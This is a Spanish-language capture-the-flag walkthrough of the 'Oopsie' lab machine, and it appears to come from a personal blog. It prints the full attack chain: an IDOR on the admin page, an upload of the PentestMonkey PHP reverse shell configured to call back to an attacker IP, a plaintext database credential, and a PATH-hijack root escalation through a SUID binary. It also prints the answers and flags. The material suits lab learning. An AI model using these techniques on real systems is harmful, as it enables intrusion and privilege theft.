---
title: Oopsie
date: 2026-10-19T19:18:00
draft: false
description: |-
  Resolución de la maquina:
  -Oopsie 🟣
  -Linux 🐧
  -Very Easy 🟢
ShowToc: true
cover:
  image: /img/OOPSIE_ Guía de Ciberseguridad.png
  alt: ''
tags: []
---

En el día de hoy vamos con la máquina Oopsie.

Antes que nada, probamos conexión.

```powershell
┌──(dani㉿kali)-[~]
└─$ ping 10.129.36.247                                             
PING 10.129.36.247 (10.129.36.247) 56(84) bytes of data.
64 bytes from 10.129.36.247: icmp_seq=1 ttl=63 time=88.7 ms
64 bytes from 10.129.36.247: icmp_seq=2 ttl=63 time=44.7 ms
^C
--- 10.129.36.247 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1002ms
rtt min/avg/max/mdev = 44.662/66.681/88.701/22.019 ms

```

Ahora bien.

## With what kind of tool can intercept web traffic?

Aunque conocemos otras herramientas como Wireshark o tcpdump, en este caso se refiere a un proxy de interceptación, como puede ser **Burp Suite;** este analiza exclusivamente tráfico web.

> **Respuesta**: proxy

## What is the path to the directory on the webserver that returns a login page?

Para saber esto, vamos a usar Burp Suite; iremos a Target y abriremos un navegador mediante Burp Suite, meteremos la IP del servidor y Burp Suite analizará todos los subdominios y la estructura.

![](/img/burp.png)

Como vemos, vemos que la página de login está dentro de cdn-cgi.

> **Respuesta:** /cdn-cgi/login

## What can be modified in Firefox to get access to the upload page?

Se tratan de las cookies; las podemos modificar para obtener acceso a páginas ocultas a las que normalmente no tendríamos acceso.

> **Respuesta:** cookie

## What is the access ID of the admin user?

Esto lo podemos averiguar editando la URL.


De normal tendremos esta vista,pero si editamos la url para editar el parametro del php.

De normal tendriamos esta:

[http://10.129.36.247/cdn-cgi/login/admin.php?content=accounts&id=2](http://10.129.36.247/cdn-cgi/login/admin.php?content=accounts&id=2)

![](/img/Captura%20desde%202026-10-19%2020-12-25.png)

Y si ponemos esta:

[http://10.129.36.247/cdn-cgi/login/admin.php?content=accounts&id=1](http://10.129.36.247/cdn-cgi/login/admin.php?content=accounts&id=1)

![](/img/Captura%20desde%202026-10-19%2020-14-09.png)

Como vemos, editando la URL tenemos acceso al ID del admin, al estar en su vista.

## On uploading a file, what directory does that file appear in on the server?

Usando gobuster, que es una herramienta de fuerza bruta para descubrir subdominios, podemos averiguar esto con el siguiente comando.

`gobuster dir -u http://10.129.36.247 -w /usr/share/wordlists/dirb/common.txt`

```powershell
┌──(dani㉿kali)-[~]
└─$ gobuster dir -u http://10.129.36.247 -w /usr/share/wordlists/dirb/common.txt

===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.36.247
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
.htaccess            (Status: 403) [Size: 278]
.hta                 (Status: 403) [Size: 278]
.htpasswd            (Status: 403) [Size: 278]
css                  (Status: 301) [Size: 312] [--> http://10.129.36.247/css/]
fonts                (Status: 301) [Size: 314] [--> http://10.129.36.247/fonts/]
images               (Status: 301) [Size: 315] [--> http://10.129.36.247/images/]
index.php            (Status: 200) [Size: 10932]
js                   (Status: 301) [Size: 311] [--> http://10.129.36.247/js/]
server-status        (Status: 403) [Size: 278]
themes               (Status: 301) [Size: 315] [--> http://10.129.36.247/themes/]
uploads              (Status: 301) [Size: 316] [--> http://10.129.36.247/uploads/]
Progress: 4613 / 4613 (100.00%)
===============================================================
Finished
===============================================================
                                                                     
```

Como vemos, hay una carpeta llamada uploads.

> **Respuesta:** /uploads

## What is the file that contains the password that is shared with the robert user?

Para averiguar esto primero vamos a acceder a la maquina,como tiene el upload podemos meter una reverse shell php(La dePentestMonkey,que viene con kali) y meteremos los parametros

En `/usr/share/webshells/php/php-reverse-shell.php`

```powershell
 GNU nano 9.0                                        shell.php *                                               
// for any actions performed using this tool.  If these terms are not acceptable to
// you, then do not use this tool.
//
// You are encouraged to send comments, improvements or suggestions to
// me at pentestmonkey@pentestmonkey.net
//
// Description
// -----------
// This script will make an outbound TCP connection to a hardcoded IP and port.
// The recipient will be given a shell running as the current user (apache normally).
//
// Limitations
// -----------
// proc_open and stream_set_blocking require PHP version 4.3+, or 5+
// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.
// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.
//
// Usage
// -----
// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.

set_time_limit (0);
$VERSION = "1.0";
$ip = '10.10.17.35';  // CHANGE THIS
$port = 4444;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

```

De forma que ahora podemos subir shell .php mientras en otra terminal escuchamos con netcat(`nc -lvnp 4444`).

Por [http://10.129.36.247/uploads/shell.php](http://10.129.36.247/uploads/shell.php)

```powershell
┌──(dani㉿kali)-[~]
└─$ nc -lvnp 4444

listening on [any] 4444 ...
connect to [10.10.17.35] from (UNKNOWN) [10.129.36.247] 34622
Linux oopsie 4.15.0-76-generic #86-Ubuntu SMP Fri Jan 17 17:24:28 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 18:39:41 up  1:12,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 


```

Ahora podemos acceder desde el servidor a la página de login y averiguar credenciales.

```powershell
$ ls
admin.php
db.php
index.php
script.js
$ cat db.php	
	<?php
$conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');
?>

```

> **Respuesta:** db.php

## What executible is run with the option "-group bugtracker" to identify all files owned by the bugtracker group?

Con find podemos encontrar todo en el sistema.

Usamos este comando `find / -group bugtracker 2>/dev/null`

```powershell
$ find / -group bugtracker 2>/dev/null
/usr/bin/bugtracker

```

> **Respuesta:** find

## Regardless of which user starts running the bugtracker executable, what's user privileges will use to run?

```powershell
$ ls -l /usr/bin/bugtracker
-rwsr-xr-- 1 root bugtracker 8792 Jan 25  2020 /usr/bin/bugtracker

```

Como vemos, root es el que tiene los permisos.

## What SUID stands for?

El SUID es un permiso para ejecutar siempre con ciertos permisos establecidos, sin importar el usuario que ejecute; la s en ls -l en los permisos indica que esto está activo.

> **Respuesta:** Set owner User ID

# What is the name of the executable being called in an insecure manner?

Si iniciamos sesión como Rober con `su rober`, al tener sus credenciales y ejecutar el binario.

```powershell
robert@oopsie:/$ bugtracker
bugtracker

------------------
: EV Bug Tracker :
------------------

Provide Bug ID: 8792
8792
---------------

cat: /root/reports/8792: No such file or directory

```

Como vemos, llama a Cat de una forma incorrecta; debería ser /bin/cat.

## Submit the flag located in the robert user's home directory.

```powershell
robert@oopsie:/$ cat /home/robert/user.txt
cat /home/robert/user.txt
f2c74ee8db7983851ab2a96a44eb7981

```

## Submit the flag located in root's home directory.

```powershell
robert@oopsie:/$ cd /tmp
cd /tmp
robert@oopsie:/tmp$ echo "/bin/bash" > cat
echo "/bin/bash" > cat
robert@oopsie:/tmp$ chmod +x cat
chmod +x cat
robert@oopsie:/tmp$ export PATH=/tmp:$PATH
export PATH=/tmp:$PATH
robert@oopsie:/tmp$ bugtracker
bugtracker

------------------
: EV Bug Tracker :
------------------

Provide Bug ID: 8792
8792
---------------

root@oopsie:/tmp# 

```

Al sustituir cat por /bin/bash y, como hemos visto con el SUID, esto se ejecutará como root; nos abrirá la terminal con root.

```powershell
root@oopsie:/tmp# /bin/cat /root/root.txt
/bin/cat /root/root.txt
af13b0bee69f8a877c3faf667f7beacf
root@oopsie:/tmp# 
```

![](/img/Captura%20desde%202026-10-19%2022-00-40.png)

Y maquina pasada!!
